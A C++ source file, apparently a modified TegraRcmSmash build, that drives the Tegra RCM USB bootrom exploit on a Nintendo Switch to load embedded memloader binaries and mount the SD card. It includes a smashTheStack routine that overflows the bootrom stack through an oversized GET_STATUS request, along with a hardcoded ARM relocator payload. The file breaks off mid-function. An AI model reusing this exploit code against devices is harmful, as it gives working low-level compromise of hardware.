/*
 *
 *  TegraRcmSmash_mountSD
 *	---------------------
 *    > TegraRcmSmash custom build allowing a one click solution to mount SD from N.Switch
 *
 *  This is a modified version of TegraRcmSmash by Rajkosto
 *  https://github.com/rajkosto/TegraRcmSmash
 *
 *  Embedded binary resources :
 *  - memloader_usb.bin : memloader custom buil (bypass menu, force USB command )
 *  - ums_sd.ini, ums_sd.scr.img & u-boot.elf : usm_sd tool by Rajkosto
 *	https://github.com/rajkosto/memloader
 *
 */

#include "Types.h"
#include "ScopeGuard.h"
#include "WinHandle.h"
#include "resource.h"
#include <assert.h>
#include <tchar.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>
#include <iostream>
#include <fstream>
#include <Shlwapi.h>
#include "libusbk_int.h"
#include "iniparse.h"
/*
 * eliboa, 22/05/2018
 *
 * Added sstream for embedded resource streams -> std::istringstream
 */
#include <sstream>


class RCMDeviceHacker
{
public:
	RCMDeviceHacker(KUSB_DRIVER_API& usbDriver_, KUSB_HANDLE usbHandle_) : usbHandle(usbHandle_), usbDriver(&usbDriver_), totalWritten(0), currentBuffer(0) {}
	~RCMDeviceHacker()
	{
		if (usbHandle != nullptr)
		{
			usbDriver->Free(usbHandle);
			usbHandle = nullptr;
		}
	}

	static constexpr u32 PACKET_SIZE = 0x1000;

	int getDriverVersion(libusbk::version_t& outVersion)
	{
		HANDLE masterHandle = INVALID_HANDLE_VALUE;
		if (!libusbk_getInternals(usbHandle, &masterHandle) || masterHandle == nullptr || masterHandle == INVALID_HANDLE_VALUE)
			return -int(ERROR_INVALID_HANDLE);

		libusbk::libusb_request myRequest;
		memset(&myRequest, 0, sizeof(myRequest));

		const auto retVal = BlockingIoctl(masterHandle, libusbk::LIBUSB_IOCTL_GET_VERSION, &myRequest, sizeof(myRequest), &myRequest, sizeof(myRequest));
		if (retVal > 0)
			outVersion = myRequest.version;

		return retVal;
	}
	int read(u8* outBuf, size_t outBufSize)
	{
		UINT lengthTransferred = 0;
		const auto retVal = usbDriver->ReadPipe(usbHandle, 0x81, outBuf, (UINT)outBufSize, &lengthTransferred, nullptr);
		if (retVal == FALSE)
			return -int(GetLastError());
		else
			return int(lengthTransferred);
	}
	int write(const u8* data, size_t dataLen, size_t packetSize = PACKET_SIZE)
	{
		int bytesRemaining = (int)dataLen;
		size_t bytesWritten = 0;
		while (bytesRemaining > 0)
		{
			const size_t bytesToWrite = (bytesRemaining < (int)packetSize) ? bytesRemaining : (int)packetSize;
			const auto retVal = writeSingleBuffer(&data[bytesWritten], bytesToWrite);
			if (retVal < 0)
				return retVal;
			else if (retVal < (int)bytesToWrite)
				return int(bytesWritten)+retVal;

			bytesWritten += retVal;
			bytesRemaining -= retVal;
		}

		return (int)bytesWritten;
	}
	int readDeviceId(u8* deviceIdBuf, size_t idBufSize)
	{
		if (idBufSize < 0x10)
			return -int(ERROR_INSUFFICIENT_BUFFER);

		return read(deviceIdBuf, 0x10);
	}
	int switchToHighBuffer()
	{
		if (currentBuffer == 0)
		{
			u8 tempZeroDatas[PACKET_SIZE];
			memset(tempZeroDatas, 0, sizeof(tempZeroDatas));

			const auto writeRes = write(tempZeroDatas, sizeof(tempZeroDatas));
			if (writeRes < 0)
				return writeRes;

			assert(currentBuffer != 0);
			return writeRes;
		}
		else
			return 0;
	}
	int smashTheStack(int length=-1)
	{
		constexpr u32 STACK_END = 0x40010000;

		if (length < 0)
			length = STACK_END - getCurrentBufferAddress();

		if (length < 1)
			return 0;

		HANDLE masterHandle = INVALID_HANDLE_VALUE;
		if (!libusbk_getInternals(usbHandle, &masterHandle) || masterHandle == nullptr || masterHandle == INVALID_HANDLE_VALUE)
			return -int(ERROR_INVALID_HANDLE);

		libusbk::libusb_request rawRequest;
		memset(&rawRequest, 0, sizeof(rawRequest));
		rawRequest.timeout = 1000; //ms
		rawRequest.status.index = 0;
		rawRequest.status.recipient = 0x02; //RECIPIENT_ENDPOINT

		ByteVector threshBuf(length, 0);
		const auto retVal = BlockingIoctl(masterHandle, libusbk::LIBUSB_IOCTL_GET_STATUS, &rawRequest, sizeof(rawRequest), &threshBuf[0], threshBuf.size());
		if (retVal < 0)
		{
			const auto theError = -retVal;
			if (theError == ERROR_SEM_TIMEOUT) //timed out, which means it probably smashed
				return (int)threshBuf.size();

			return theError;
		}
		else
			return retVal;
	}
protected:
	u32 getCurrentBufferAddress() const
	{
		return (currentBuffer == 0) ? 0x40005000u : 0x40009000u;
	}
	u32 toggleBuffer()
	{
		const auto prevBuffer = currentBuffer;
		currentBuffer = (currentBuffer == 0) ? 1u : 0u;
		return prevBuffer;
	}
	int writeSingleBuffer(const u8* data, size_t dataLen)
	{
		toggleBuffer();

		UINT lengthTransferred = 0;
		const auto retVal = usbDriver->WritePipe(usbHandle, 0x01, (u8*)data, (UINT)dataLen, &lengthTransferred, nullptr);
		if (retVal == FALSE)
			return -int(GetLastError());
		else
			return (int)lengthTransferred;
	}

	static int BlockingIoctl(HANDLE driverHandle, DWORD ioctlCode, const void* inputBytes, size_t numInputBytes, void* outputBytes, size_t numOutputBytes)
	{
		WinHandle theEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
		if (theEvent.get() == nullptr || theEvent.get() == INVALID_HANDLE_VALUE)
			return false;

		OVERLAPPED overlapped;
		memset(&overlapped, 0, sizeof(overlapped));
		if (DeviceIoControl(driverHandle, ioctlCode, (LPVOID)inputBytes, (DWORD)numInputBytes, (LPVOID)outputBytes, (DWORD)numOutputBytes, nullptr, &overlapped) == FALSE)
		{
			const auto errCode = GetLastError();
			if (errCode != ERROR_IO_PENDING)
				return -int(errCode);
		}

		DWORD bytesReceived = 0;
		if (GetOverlappedResult(driverHandle, &overlapped, &bytesReceived, TRUE) == FALSE)
		{
			const auto errCode = GetLastError();
			return -int(errCode);
		}

		return (int)bytesReceived;
	}

	KUSB_HANDLE usbHandle;
	KUSB_DRIVER_API* usbDriver;
	size_t totalWritten;
	u32 currentBuffer;
};

static KLST_DEVINFO pluggedInDevice;
static WinHandle gotDeviceEvent;

static u32 deviceVid = 0x0955;
static u32 devicePid = 0x7321;
static void KUSB_API HotPlugEventCallback(KHOT_HANDLE Handle, KLST_DEVINFO_HANDLE DeviceInfo, KLST_SYNC_FLAG NotificationType)
{
	if (NotificationType == KLST_SYNC_FLAG_ADDED && DeviceInfo != nullptr &&
		DeviceInfo->Common.Vid == deviceVid && DeviceInfo->Common.Pid == devicePid)
	{
		memcpy(&pluggedInDevice, DeviceInfo, sizeof(pluggedInDevice));
		SetEvent(gotDeviceEvent.get());
	}
}

static WinHandle finishedUpEvent;
static BOOL WINAPI ConsoleSignalHandler(DWORD signal)
{
	switch (signal)
	{
	case CTRL_CLOSE_EVENT:
	case CTRL_LOGOFF_EVENT:
	case CTRL_SHUTDOWN_EVENT:
	case CTRL_C_EVENT:
		memset(&pluggedInDevice, 0, sizeof(pluggedInDevice));
		SetEvent(gotDeviceEvent.get());
		if (WaitForSingleObject(finishedUpEvent.get(), 1000) == WAIT_OBJECT_0)
			finishedUpEvent = WinHandle();
		else
			_ftprintf(stderr, TEXT("Timed out waiting for cleanup, forcibly closing\n"));
	default:
		break;
	}

	return TRUE;
}

static int WrappedPrintToErr(const char* format, ...)
{
	char tempBuf[1024];
	tempBuf[0] = 0;

	va_list vargs;
	va_start(vargs, format);
	int numPrinted = vsprintf_s(tempBuf, format, vargs);
	va_end(vargs);

	WinString widened(&tempBuf[0], &tempBuf[numPrinted]);
	_ftprintf(stderr, widened.c_str());

	return numPrinted;
}

int _tmain(int argc, TCHAR* argv[])
{
#ifdef UNICODE
	fflush(stdout);
	_setmode(_fileno(stdout), _O_WTEXT);
	fflush(stderr);
	_setmode(_fileno(stderr), _O_WTEXT);
#endif

	argc = 4;
	argv[0] = TEXT("");
	argv[1] = TEXT("memloader_usb.bin");
	argv[2] = TEXT("-r");
	argv[3] = TEXT("--dataini=ums_sd.ini");
	//FindResource(NULL, MAKEINTRESOURCE(IDR_MEMLDR_FILE), RT_RCDATA);
	HRSRC memloader = FindResource(NULL, MAKEINTRESOURCE(MEMLOADER), RT_RCDATA);
	if (!memloader)
		return -10;
	HGLOBAL memloader_handle = LoadResource(NULL, memloader);
	if (!memloader_handle)
		return -10;
	char * memloader_data = (char*)LockResource(memloader_handle);
	DWORD memloader_size = SizeofResource(NULL, memloader);

	const TCHAR DEFAULT_MEZZO_FILENAME[] = TEXT("intermezzo.bin");
	const TCHAR* mezzoFilename = DEFAULT_MEZZO_FILENAME;
	const TCHAR* iniFilename = nullptr;
	const TCHAR* inputFilename = nullptr;
	bool waitForDevice = false;
	bool readbackUsb = false;

	struct LoadDataItem
	{
		std::string name;
		WinString filename;
		size_t offset = 0;
		size_t maxCount = 0;
		size_t address = 0;
		bool reloaded = false;
		ByteVector dataBytes;
	};
	vector<LoadDataItem> loadData;

	struct CopyDataItem
	{
		std::string name;
		size_t srcaddr = 0;
		size_t srclen = 0;
		size_t dstaddr = 0;
		size_t dstlen = 0;
		u32 copyType = 0;
	};
	vector<CopyDataItem> copyData;

	struct BootDataItem
	{
		std::string name;
		WinString filename;
		size_t pc = 0;
	};
	vector<BootDataItem> bootData;

	auto PrintUsage = []() -> int
	{
		_tprintf(TEXT("Usage: TegraRcmSmash.exe [-V 0x0955] [-P 0x7321] [--relocator=intermezzo.bin] [-w] inputFilename.bin [-r] [--dataini=coreboot.ini] ([PARAM:VALUE]|[0xADDR:filename])*\n"));
		return -1;
	};

	const TCHAR HEXA_PREFIX[] = TEXT("0x");
	for (int i=1; i<argc; i++)
	{
		TCHAR* currArg = argv[i];

		const TCHAR RELOCATOR_ARGUMENT[] = TEXT("--relocator");
		const TCHAR INIFILE_ARGUMENT[] = TEXT("--dataini");
		const TCHAR VENDOR_ARGUMENT[] = TEXT("-V");
		const TCHAR PRODUCT_ARGUMENT[] = TEXT("-P");
		const TCHAR WAIT_ARGUMENT[] = TEXT("-w");
		const TCHAR READBACK_ARGUMENT[] = TEXT("-r");

		if (_tcsnicmp(currArg, RELOCATOR_ARGUMENT, array_countof(RELOCATOR_ARGUMENT)-1) == 0 ||
			_tcsnicmp(currArg, INIFILE_ARGUMENT, array_countof(INIFILE_ARGUMENT)-1) == 0)
		{
			const TCHAR* matchedStr = nullptr;
			size_t matchedLen = 0;

			if (_tcsnicmp(currArg, RELOCATOR_ARGUMENT, array_countof(RELOCATOR_ARGUMENT)-1) == 0)
			{
				matchedStr = RELOCATOR_ARGUMENT;
				matchedLen = array_countof(RELOCATOR_ARGUMENT)-1;
			}
			else if (_tcsnicmp(currArg, INIFILE_ARGUMENT, array_countof(INIFILE_ARGUMENT)-1) == 0)
			{
				matchedStr = INIFILE_ARGUMENT;
				matchedLen = array_countof(INIFILE_ARGUMENT)-1;
			}

			const TCHAR* currFilename = nullptr;
			if (currArg[matchedLen] == '=')
				currFilename = &currArg[matchedLen+1];
			else if (currArg[matchedLen] == 0)
			{
				if (i==argc-1)
					return PrintUsage();

				currFilename = argv[++i];
			}
			else
				return PrintUsage();

			if (matchedStr == RELOCATOR_ARGUMENT)
				mezzoFilename = currFilename;
			else if (matchedStr == INIFILE_ARGUMENT)
				iniFilename = currFilename;
		}
		else if (_tcsnicmp(currArg, VENDOR_ARGUMENT, array_countof(VENDOR_ARGUMENT)-1) == 0 ||
				_tcsnicmp(currArg, PRODUCT_ARGUMENT, array_countof(PRODUCT_ARGUMENT)-1) == 0)
		{
			const TCHAR* matchedStr = nullptr;
			size_t matchedLen = 0;

			if (_tcsnicmp(currArg, VENDOR_ARGUMENT, array_countof(VENDOR_ARGUMENT)-1) == 0)
			{
				matchedStr = VENDOR_ARGUMENT;
				matchedLen = array_countof(VENDOR_ARGUMENT)-1;
			}
			else if (_tcsnicmp(currArg, PRODUCT_ARGUMENT, array_countof(PRODUCT_ARGUMENT)-1) == 0)
			{
				matchedStr = PRODUCT_ARGUMENT;
				matchedLen = array_countof(PRODUCT_ARGUMENT)-1;
			}

			const TCHAR* numberValueStr = nullptr;
			if (currArg[matchedLen] == '=')
				numberValueStr = &currArg[matchedLen+1];
			else if (currArg[matchedLen] == 0)
			{
				if (i==argc-1)
					return PrintUsage();

				numberValueStr = argv[++i];
			}
			else
				return PrintUsage();

			if (_tcslen(numberValueStr) >= array_countof(HEXA_PREFIX) &&
				_tcsnicmp(numberValueStr, HEXA_PREFIX, array_countof(HEXA_PREFIX)-1) == 0)
				numberValueStr += array_countof(HEXA_PREFIX)-1;

			if (matchedStr == VENDOR_ARGUMENT)
				deviceVid = _tcstoul(numberValueStr, nullptr, 0x10);
			else if (matchedStr == PRODUCT_ARGUMENT)
				devicePid = _tcstoul(numberValueStr, nullptr, 0x10);
			else
				return PrintUsage();
		}
		else if (_tcsnicmp(currArg, WAIT_ARGUMENT, array_countof(WAIT_ARGUMENT)) == 0)
		{
			waitForDevice = true;
		}
		else if (_tcsnicmp(currArg, READBACK_ARGUMENT, array_countof(READBACK_ARGUMENT)) == 0)
		{
			readbackUsb = true;
		}
		else if (currArg[0] == '-') //unknown option
		{
			_ftprintf(stderr, TEXT("Unknown option %Ts\n"), currArg);
			return PrintUsage();
		}
		else //payload/data filename
		{
			if (inputFilename == nullptr)
				inputFilename = currArg;
			else
			{
				auto colonPos = _tcschr(currArg, ':');
				if (colonPos == nullptr)
				{
					_ftprintf(stderr, TEXT("No colon separator in additional data argument '%Ts'\n"), currArg);
					return PrintUsage();
				}

				*colonPos = 0;
				const size_t leftPartLen = colonPos-currArg;
				const TCHAR* leftPart = currArg;
				const TCHAR* rightPart = colonPos+1;

				if (leftPartLen >= array_countof(HEXA_PREFIX) &&
					_tcsnicmp(leftPart, HEXA_PREFIX, array_countof(HEXA_PREFIX)-1) == 0)
				{
					leftPart += array_countof(HEXA_PREFIX)-1;

					LoadDataItem newItem;
					wchar_t* endPos = nullptr;
					if (sizeof(newItem.address) == sizeof(unsigned long))
						newItem.address = _tcstoul(leftPart, &endPos, 0x10);
					else
						newItem.address = (size_t)_tcstoull(leftPart, &endPos, 0x10);

					if (endPos == nullptr || endPos == leftPart)
					{
						_ftprintf(stderr, TEXT("Invalid load address '%Ts' in additional data argument '%Ts'\n"), leftPart, currArg);
						return PrintUsage();
					}

					auto it = std::find_if(loadData.cbegin(), loadData.cend(), [&newItem](const LoadDataItem& itm) {
						return itm.address == newItem.address;
					});

					if (it != loadData.cbegin())
					{
						_ftprintf(stderr, TEXT("Load address 0x%08llx already defined with filename '%Ts'\n"), (u64)it->address, it->filename.c_str());
						return PrintUsage();
					}

					newItem.filename = rightPart;
					loadData.emplace_back(std::move(newItem));
				}
				else
				{
					std::string convAscii; convAscii.reserve(_tcslen(leftPart));
					for (size_t strPos=0; strPos<leftPartLen; strPos++)
						convAscii.push_back((char)leftPart[strPos]);

					if (strcmp(convAscii.c_str(), "BOOT") == 0)
					{
						if (bootData.size() > 0)
						{
							if (bootData[0].filename.length() > 0)
								_ftprintf(stderr, TEXT("Load parameter %hs already defined with value '%Ts'\n"), convAscii.c_str(), bootData[0].filename.c_str());
							else
								_ftprintf(stderr, TEXT("Load parameter %hs already defined with value 0x%08llx\n"), convAscii.c_str(), (u64)bootData[0].pc);

							return PrintUsage();
						}

						bootData.resize(1, BootDataItem());
						if (_tcsnicmp(rightPart, HEXA_PREFIX, array_countof(HEXA_PREFIX)-1) == 0)
						{
							rightPart += array_countof(HEXA_PREFIX)-1;

							wchar_t* endPos = nullptr;
							if (sizeof(bootData[0].pc) == sizeof(unsigned long))
								bootData[0].pc = _tcstoul(rightPart, &endPos, 0x10);
							else
								bootData[0].pc = (size_t)_tcstoull(rightPart, &endPos, 0x10);

							if (endPos == nullptr || endPos == rightPart)
							{
								_ftprintf(stderr, TEXT("Invalid boot address '%Ts' specified\n"), rightPart);
								return PrintUsage();
							}
						}
						else
							bootData[0].filename = rightPart;
					}
					else
					{
						LoadDataItem newItem;
						newItem.name = std::move(convAscii);

						auto it = std::find_if(loadData.cbegin(), loadData.cend(), [&newItem](const LoadDataItem& itm) {
							return stricmp(itm.name.c_str(), newItem.name.c_str()) == 0;
						});

						if (it != loadData.cbegin())
						{
							_ftprintf(stderr, TEXT("Load parameter %hs already defined with value '%Ts'\n"), it->name.c_str(), it->filename.c_str());
							return PrintUsage();
						}

						newItem.filename = rightPart;
						loadData.emplace_back(std::move(newItem));
					}
				}
			}
		}
	}

	//print program name and version
	{
		TCHAR stringBuf[2048];
		stringBuf[0] = 0;
		const auto numChars = GetModuleFileName(NULL, stringBuf, (DWORD)array_countof(stringBuf)-1);
		stringBuf[numChars] = 0;

		const TCHAR* versionInfoStr = TEXT("[UNKNOWN VERSION]");
		if (GetFileVersionInfo(stringBuf, 0, sizeof(stringBuf), stringBuf))
		{
			VS_FIXEDFILEINFO* fileInfo = nullptr;
			unsigned int infoLen = 0;
			if (VerQueryValue(stringBuf, TEXT("\\"), (LPVOID*)&fileInfo, &infoLen) && fileInfo != nullptr && infoLen > 0)
			{
				const u32 outMajor = HIWORD(fileInfo->dwFileVersionMS);
				const u32 outMinor = LOWORD(fileInfo->dwFileVersionMS);
				const u32 outRev	= HIWORD(fileInfo->dwFileVersionLS);
				const u32 outBld	= LOWORD(fileInfo->dwFileVersionLS);

				_stprintf_s(stringBuf, TEXT("%u.%u.%u-%u"), outMajor, outMinor, outRev, outBld);
				versionInfoStr = stringBuf;
			}
		}

		const TCHAR* bitnessStr = nullptr;
#if !_WIN64
		bitnessStr = TEXT("32bit");
#else
		bitnessStr = TEXT("64bit");
#endif
		_tprintf(TEXT("TegraRcmSmash (%Ts) %Ts by rajkosto\n"), bitnessStr, versionInfoStr);
	}

	//check all arguments
	if (deviceVid == 0 || deviceVid >= 0xFFFF)
	{
		_ftprintf(stderr, TEXT("Invalid USB VID specified\n"));
		return PrintUsage();
	}
	if (devicePid == 0 || devicePid >= 0xFFFF)
	{
		_ftprintf(stderr, TEXT("Invalid USB PID specified\n"));
		return PrintUsage();
	}
	if (inputFilename == nullptr || _tcslen(inputFilename) == 0)
	{
		_ftprintf(stderr, TEXT("Please specify input filename\n"));
		return PrintUsage();
	}

	auto ReadFileToBuf = [](ByteVector& outBuf, const TCHAR* fileType, const TCHAR* inputFilename, size_t offset, size_t maxSize, bool silent) -> int
	{

		/*
		 * BEGIN
		 * eliboa 22/05/2018
		 *
		 * Load binaries from embedded resources
		 */
		std::wstring path(inputFilename);
		int ovl, res;
		res = path.find(L"ums_sd.ini");
		if (res >= 0) ovl = INIFILE;
		res = path.find(L"ums_sd.scr.img");
		if (res >= 0) ovl = UMS_SD_SCR_IMG;
		res = path.find(L"memloader_usb.bin");
		if (res >= 0) ovl = MEMLOADER;
		res = path.find(L"u-boot.elf");
		if (res >= 0) ovl = UBOOT_ELF;

		if (ovl > 0)
		{
			HRSRC overload = FindResource(NULL, MAKEINTRESOURCE(ovl), RT_RCDATA);;
			HGLOBAL overload_handle = LoadResource(NULL, overload);
			char *  overload_data = (char*)LockResource(overload_handle);
			size_t overload_size = SizeofResource(NULL, overload);
			std::string casted_memory(static_cast<char*>(overload_data), overload_size);
			std::istringstream inputFile(casted_memory);

			inputFile.seekg(0, std::ios::end);
			const auto inputSize = (size_t)inputFile.tellg();
			inputFile.seekg(offset, std::ios::beg);

			if (inputSize > offset)
				outBuf.resize(inputSize - offset);
			else
				outBuf.resize(0);

			if (maxSize != 0 && maxSize < outBuf.size())
				outBuf.resize(maxSize);

			if (outBuf.size() > 0)
			{
				inputFile.read((char*)&outBuf[0], outBuf.size());
				return 0;
			}
		}
		/*
		 * END
		 * eliboa
		 */

		std::ifstream inputFile(inputFilename, std::ios::binary);

		if (!inputFile.is_open())
		{
			if (!silent)
				_ftprintf(stderr, TEXT("Couldn't open %Ts file '%Ts' for reading\n"), fileType, inputFilename);

			return -2;
		}

		inputFile.seekg(0, std::ios::end);
		const auto inputSize = (size_t)inputFile.tellg();
		inputFile.seekg(offset, std::ios::beg);

		if (inputSize > offset)
			outBuf.resize(inputSize-offset);
		else
			outBuf.resize(0);

		if (maxSize != 0 && maxSize < outBuf.size())
			outBuf.resize(maxSize);

		if (outBuf.size() > 0)
		{
			inputFile.read((char*)&outBuf[0], outBuf.size());
			const auto bytesRead = inputFile.gcount();
			if (bytesRead < (std::streamsize)outBuf.size())
			{
				_ftprintf(stderr, TEXT("Error reading %Ts file '%Ts' (only %llu out of %llu bytes read)\n"), fileType, inputFilename, (u64)bytesRead, (u64)outBuf.size());
				return -2;
			}
		}

		return 0;
	};

	if (iniFilename != nullptr)
	{

		ByteVector iniBuf;
		auto iniReadRes = ReadFileToBuf(iniBuf, TEXT("ini"), iniFilename, 0, 0, false);
		if (iniReadRes)
			return iniReadRes;

		if (iniBuf.size() > 0)
		{
			auto parsedInfo = parse_memloader_ini((char*)&iniBuf[0], (int)iniBuf.size(), malloc, WrappedPrintToErr);
			auto infoGuard = MakeScopeGuard([&parsedInfo]() { free_memloader_info(&parsedInfo, free); });

			if (parsedInfo.loads != nullptr)
			{
				WinString fileBaseDir;
				{
					TCHAR absDirPath[2048];
					absDirPath[0] = 0;

					TCHAR* filePart = nullptr;
					size_t pathLen = GetFullPathName(iniFilename, (unsigned int)array_countof(absDirPath)-1, absDirPath, &filePart);
					if (filePart != nullptr)
					{
						*filePart = 0;
						pathLen = filePart-absDirPath;
					}

					fileBaseDir = WinString(absDirPath, pathLen);
				}

				for (auto currLoadNode = parsedInfo.loads; currLoadNode != nullptr; currLoadNode=currLoadNode->next)
				{
					const auto& currLoad = currLoadNode->curr;

					LoadDataItem newItem;
					newItem.name = currLoad.sectname;
					newItem.offset = currLoad.skip;
					newItem.maxCount = currLoad.count;
					newItem.address = currLoad.dst;

					if (sizeof(TCHAR) == sizeof(char))
						newItem.filename = WinString(currLoad.filename, currLoad.filename+strlen(currLoad.filename));
					else
					{
						TCHAR convFilename[2048];
						convFilename[0] = 0;

						const auto numChars = MultiByteToWideChar(CP_UTF8, 0, currLoad.filename, -1, convFilename, (int)array_countof(convFilename)-1);
						if (numChars > 0)
							newItem.filename = WinString(convFilename, numChars-1);
					}

					//make it absolute
					if (fileBaseDir.length() > 1)
					{
						wchar_t wideFilename[2048];
						wideFilename[0] = 0;

						const wchar_t* combinedPath = PathCombine(wideFilename, fileBaseDir.c_str(), newItem.filename.c_str());
						newItem.filename = combinedPath;
					}

					loadData.emplace_back(std::move(newItem));
				}
			}

			for (auto currBootNode = parsedInfo.copies; currBootNode != nullptr; currBootNode=currBootNode->next)
			{
				const auto& currCopy = currBootNode->curr;

				CopyDataItem newItem;
				newItem.name = currCopy.sectname;
				newItem.copyType = currCopy.compType;
				newItem.srcaddr = currCopy.src;
				newItem.srclen = currCopy.srclen;
				newItem.dstaddr = currCopy.dst;
				newItem.dstlen = currCopy.dstlen;

				copyData.emplace_back(std::move(newItem));
			}

			for (auto currBootNode = parsedInfo.boots; currBootNode != nullptr; currBootNode=currBootNode->next)
			{
				const auto& currBoot = currBootNode->curr;

				BootDataItem newItem;
				newItem.name = currBoot.sectname;
				newItem.pc = currBoot.pc;

				bootData.emplace_back(std::move(newItem));
			}
		}
	}

	std::sort(loadData.begin(), loadData.end(), [](const LoadDataItem& left, const LoadDataItem& right)
	{
		if (left.name.length() != 0 && right.name.length() == 0) //named go first
			return true;
		if (left.name.length() == 0 && right.name.length() != 0)
			return false;

		if (left.address != 0 && right.address != 0)
			return left.address < right.address;
		else
			return (strcmp(left.name.c_str(), right.name.c_str()) < 0);
	});

	//load file contents
	for (auto& currData : loadData)
	{
		auto readFileRes = ReadFileToBuf(currData.dataBytes, TEXT("data"), currData.filename.c_str(), currData.offset, currData.maxCount, false);
		if (readFileRes != 0)
			return readFileRes;
	}

	//populate address for BOOT if necessary
	for (auto& currBoot : bootData)
	{
		if (currBoot.filename.length() == 0)
			continue;

		bool foundAddress = false;
		for (const auto& otherData : loadData)
		{
			if (otherData.name.length() == 0 && _tcsicmp(currBoot.filename.c_str(), otherData.filename.c_str()) == 0)
			{
				currBoot.pc = otherData.address;
				foundAddress = true;
				break;
			}
		}

		if (!foundAddress)
		{
			_ftprintf(stderr, TEXT("No load address defined for filename '%Ts' (required for setting BOOT)\n"), currBoot.filename.c_str());
			return -1;
		}
	}

	//intentional ptr comparison, if user supplied their own filename always read it
	auto usingBuiltinMezzo = (mezzoFilename == DEFAULT_MEZZO_FILENAME);
	bool usingNoMezzo = false;
	if (mezzoFilename == nullptr || _tcslen(mezzoFilename) == 0)
	{
		usingBuiltinMezzo = true;
		usingNoMezzo = true;
	}

	ByteVector mezzoBuf;
	if (!usingNoMezzo)
	{
		auto readFileRes = ReadFileToBuf(mezzoBuf, TEXT("relocator"), mezzoFilename, 0, 0, usingBuiltinMezzo);
		if (readFileRes != 0)
		{
			if (usingBuiltinMezzo)
			{
				const byte BUILTIN_INTERMEZZO[] =
				{
					0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
					0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
					0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
					0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
					0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
					0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
				};

				mezzoBuf.resize(sizeof(BUILTIN_INTERMEZZO));
				memcpy(&mezzoBuf[0], BUILTIN_INTERMEZZO, mezzoBuf.size());
			}
			else
				return readFileRes;
		}
		else
			usingBuiltinMezzo = false;
	}

	ByteVector userFileBuf;
	auto readFileRes = ReadFileToBuf(userFileBuf, TEXT("payload"), inputFilename, 0, 0, false);
	if (readFileRes != 0)
		return readFileRes;

	KLST_DEVINFO_HANDLE deviceInfo = nullptr;

	KLST_HANDLE deviceList = nullptr;
	if (!LstK_Init(&deviceList, KLST_FLAG_NONE))
	{
		const auto errorCode = GetLastError();
		_ftprintf(stderr, TEXT("Got win32 error %u trying to list USB devices\n"), errorCode);
		return -3;
	}
	auto lstKgrd = MakeScopeGuard([&deviceList]()
	{
		if (deviceList != nullptr)
		{
			LstK_Free(deviceList);
			deviceList = nullptr;
		}
	});

	// Get the number of devices contained in the device list.
	UINT deviceCount = 0;
	LstK_Count(deviceList, &deviceCount);
	if (deviceCount == 0 || LstK_FindByVidPid(deviceList, deviceVid, devicePid, &deviceInfo) == FALSE)
	{
		if (!waitForDevice)
		{
			_ftprintf(stderr, TEXT("No TegraRCM devices found and -w option not specified\n"));
			return -3;
		}

		_tprintf(TEXT("Wanted device not connected yet, waiting...\n"));
		lstKgrd.run();

		KHOT_HANDLE hotHandle = nullptr;
		KHOT_PARAMS hotParams;

		memset(&hotParams, 0, sizeof(hotParams));
		hotParams.OnHotPlug = HotPlugEventCallback;
		hotParams.Flags = KHOT_FLAG_NONE;

		memset(&pluggedInDevice, 0, sizeof(pluggedInDevice));
		gotDeviceEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
		finishedUpEvent = CreateEvent(nullptr, TRUE, FALSE, nullptr);
		sprintf_s(hotParams.PatternMatch.DeviceID, "*VID_%04X&PID_%04X*", deviceVid, devicePid);
		_tprintf(TEXT("Looking for devices matching the pattern %s\n"),
			WinString(std::begin(hotParams.PatternMatch.DeviceID), std::end(hotParams.PatternMatch.DeviceID)).c_str());

		// Initializes a new HotK handle.
		if (!HotK_Init(&hotHandle, &hotParams))
		{
			const auto errorCode = GetLastError();
			_ftprintf(stderr,TEXT("Hotplug listener init failed with win32 error %u\n"), errorCode);
			return -4;
		}
		auto hotKgrd = MakeScopeGuard([&hotHandle]()
		{
			if (hotHandle != nullptr)
			{
				HotK_Free(hotHandle);
				hotHandle = nullptr;
			}
		});

		if (SetConsoleCtrlHandler(ConsoleSignalHandler, TRUE))
			WaitForSingleObject(gotDeviceEvent.get(), INFINITE);

		gotDeviceEvent = WinHandle();
		if (pluggedInDevice.Common.Vid == deviceVid && pluggedInDevice.Common.Pid == devicePid && pluggedInDevice.Connected == TRUE) //got the device after waiting
		{
			finishedUpEvent = WinHandle();
			deviceInfo = &pluggedInDevice;
			SetConsoleCtrlHandler(ConsoleSignalHandler, FALSE);
		}
		else
		{
			_tprintf(TEXT("Exiting due to user cancellation\n"));
			SetEvent(finishedUpEvent.get());
			return -5;
		}
	}

	if (deviceInfo != nullptr)
	{
		if (deviceInfo->DriverID != KUSB_DRVID_LIBUSBK)
		{
			_tprintf(TEXT("The selected device path %hs with VID_%04X&PID_%04x isn't using the libusbK driver\n"),
				deviceInfo->DevicePath, deviceInfo->Common.Vid, deviceInfo->Common.Pid);
			_tprintf(TEXT("Please run Zadig and install the libusbK (v3.0.7.0) driver for this device\n"));

			_ftprintf(stderr,TEXT("Failed to open USB device handle because of wrong driver installed\n"));
			return -6;
		}

		KUSB_DRIVER_API Usb;
		LibK_LoadDriverAPI(&Usb, deviceInfo->DriverID);

		// Initialize the device
		KUSB_HANDLE handle = nullptr;
		if (!Usb.Init(&handle, deviceInfo))
		{
			const auto errorCode = GetLastError();
			_ftprintf(stderr,TEXT("Failed to open USB device handle with win32 error %u\n"), errorCode);
			return -6;
		}
		else
			_tprintf(TEXT("Opened USB device path %hs\n"), deviceInfo->DevicePath);

